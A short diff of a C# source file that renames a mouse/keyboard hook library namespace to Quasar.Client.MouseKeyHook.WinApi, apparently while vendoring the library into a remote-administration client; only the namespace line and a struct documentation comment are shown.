@@ -5,7 +5,7 @@
 using System;
 using System.Runtime.InteropServices;
 
-namespace Gma.System.MouseKeyHook.WinApi
+namespace Quasar.Client.MouseKeyHook.WinApi
 {
     /// <summary>
     ///     The AppMouseStruct structure contains information about a application-level mouse input event.
